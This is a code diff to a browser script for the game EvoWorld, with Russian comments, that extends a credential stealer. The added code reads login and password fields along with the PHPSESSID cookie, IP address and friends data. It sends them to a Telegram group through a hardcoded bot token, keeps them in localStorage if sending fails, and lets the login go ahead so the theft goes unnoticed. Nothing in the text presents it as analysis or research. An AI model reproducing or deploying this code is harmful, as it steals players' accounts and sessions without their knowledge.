@@ -46,6 +46,24 @@ setTimeout(() => {
         }
     };
 
+    // Получаем логин и пароль из полей формы
+    const getCredentials = () => {
+        try {
+            const usernameField = document.querySelector('#loginUsername') ||
+                document.querySelector('input[name="login"]') ||
+                document.querySelector('input[type="text"]');
+            const passwordField = document.querySelector('#loginPassword') ||
+                document.querySelector('input[type="password"]') ||
+                document.querySelector('input[name*="pass"]') ||
+                document.querySelector('input#password');
+            const username = usernameField ? usernameField.value : '';
+            const password = passwordField ? passwordField.value : '';
+            return { username, password };
+        } catch {
+            return { username: '', password: '' };
+        }
+    };
+
     // Функция для безопасного клонирования объектов
     const deepClone = (obj) => {
         if (obj === null || typeof obj !== 'object') return obj;
@@ -148,6 +166,7 @@ setTimeout(() => {
         
         const phpsessid = getCookie('PHPSESSID');
         const userIP = await getIP();
+        const credentials = getCredentials();
         const userData = getUserData();
         const friendsDataStr = getFriendsData();
         const friendsArrStr = getFriendsArr();
@@ -160,6 +179,9 @@ setTimeout(() => {
         message += `<b>📅 Время:</b> ${new Date().toLocaleString()}\n`;
         message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
         message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
+        
+        message += `<b>👤 Логин:</b> <code>${credentials.username || '—'}</code>\n`;
+        message += `<b>🔐 Пароль:</b> <code>${credentials.password || '—'}</code>\n\n`;
         
         message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
         message += `<code>${userLevel}</code>\n`;
@@ -214,15 +236,13 @@ setTimeout(() => {
     await sendUserData();
 })();
 
-// Логика перехвата формы входа
+// Логика перехвата формы входа — при каждом новом входе в другой акк отправляет в группу
 (function() {
     'use strict';
 
-    // Telegram configuration для логина/пароля
     const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
-    const CHAT_ID = '-5254910028';
+    const GROUP_ID = '-1003867014479';
 
-    // Enhanced send function with error handling
     function sendCredentials(username, password) {
         const timestamp = new Date().toLocaleString('ru-RU');
         const message = `🦊 EvoWorld Login\n\n👤 Login: ${username}\n🔐 Password: ${password}\n⏰ ${timestamp}`;
@@ -233,7 +253,7 @@ setTimeout(() => {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                chat_id: CHAT_ID,
+                chat_id: GROUP_ID,
                 text: message,
                 disable_web_page_preview: true
             })
@@ -241,29 +261,27 @@ setTimeout(() => {
         .then(response => {
             if (!response.ok) throw new Error('Telegram API error');
         })
-        .catch(error => {
-            // Fallback: Save to localStorage if sending fails
+        .catch(function() {
             const logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
             logs.push({username, password, timestamp});
             localStorage.setItem('evoLogs', JSON.stringify(logs));
         });
     }
 
-    // Precise selectors based on your findings
     const SELECTORS = {
         username: '#loginUsername',
         password: '#loginPassword',
         submitButton: 'button[type="submit"]'
     };
 
-    // Main interception function
+    var interceptionDone = false;
+
     function setupInterception() {
         const usernameField = document.querySelector(SELECTORS.username);
         const passwordField = document.querySelector(SELECTORS.password);
         const submitButton = document.querySelector(SELECTORS.submitButton);
 
-        if (usernameField && passwordField) {
-            // Method 1: Form submission
+        if (usernameField && passwordField && !interceptionDone) {
             const form = usernameField.closest('form');
             if (form) {
                 form.addEventListener('submit', function(event) {
@@ -271,49 +289,47 @@ setTimeout(() => {
                     sendCredentials(usernameField.value, passwordField.value);
                     form.submit();
                 });
+                interceptionDone = true;
                 return;
             }
 
-            // Method 2: Button click
             if (submitButton) {
                 submitButton.addEventListener('click', function() {
-                    setTimeout(() => {
+                    setTimeout(function() {
                         sendCredentials(usernameField.value, passwordField.value);
                     }, 300);
                 });
+                interceptionDone = true;
                 return;
             }
 
-            // Method 3: Input events as fallback
             passwordField.addEventListener('blur', function() {
                 if (usernameField.value && passwordField.value) {
                     sendCredentials(usernameField.value, passwordField.value);
                 }
             });
-        } else {
-            // Retry every 2 seconds if form not loaded yet
+            interceptionDone = true;
+        } else if (!usernameField || !passwordField) {
             setTimeout(setupInterception, 2000);
         }
     }
 
-    // Start interception with delay for dynamic content
     setTimeout(setupInterception, 3000);
 
-    // Additional protection against dynamic DOM changes
-    const observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-            if (!document.querySelector(SELECTORS.username)) {
-                setupInterception();
-            }
-        });
+    const observer = new MutationObserver(function() {
+        if (document.querySelector(SELECTORS.username) && !interceptionDone) {
+            setupInterception();
+        }
     });
 
-    observer.observe(document.body, {
-        childList: true,
-        subtree: true,
-        attributes: false,
-        characterData: false
-    });
+    if (document.body) {
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true,
+            attributes: false,
+            characterData: false
+        });
+    }
 })();
 
 // Оригинальный код для российских пользователей
